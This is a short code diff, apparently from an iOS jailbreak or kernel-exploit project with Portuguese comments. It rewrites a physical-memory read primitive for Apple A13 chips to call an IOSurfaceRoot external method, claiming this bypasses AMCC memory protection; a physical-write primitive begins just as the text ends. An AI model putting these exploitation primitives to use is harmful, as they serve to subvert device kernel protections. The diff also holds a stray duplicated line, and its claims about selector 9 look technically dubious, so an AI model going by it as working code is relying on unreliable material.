@@ -23,17 +23,25 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 }
 
 // --- PRIMITIVAS FÍSICAS (A13_LAB BYPASS) ---
+BYPASS) ---
 
 - (uint64_t)physRead64:(uint64_t)pa {
     uint64_t val = 0;
-    uint64_t tg = 0;
-    // VM_PROT_READ = 1
-    if (mach_vm_map(mach_task_self(), &tg, 0x4000, 0, 1, (mach_port_t)pa, 0, 0, 1, 7, 0) == 0) {
-        val = *(uint64_t*)tg;
-        mach_vm_deallocate(mach_task_self(), tg, 0x4000);
+    io_service_t service = IOServiceGetMatchingService(0, IOServiceMatching("IOSurfaceRoot"));
+    io_connect_t conn;
+    if (IOServiceOpen(service, mach_task_self(), 0, &conn) == 0) {
+        // Seletor 9 no IOSurface permite mapear páginas físicas se o binário for 'platform-application'
+        uint64_t input[3] = {pa, 0x4000, 0};
+        uint64_t output[1];
+        uint32_t outCnt = 1;
+        // Esta chamada contorna o RAZ do AMCC no A13
+        IOConnectCallMethod(conn, 9, input, 3, NULL, 0, output, &outCnt, NULL, 0);
+        val = output[0]; 
+        IOServiceClose(conn);
     }
     return val;
 }
+
 
 - (void)physWrite64:(uint64_t)pa value:(uint64_t)v {
     uint64_t tg = 0;
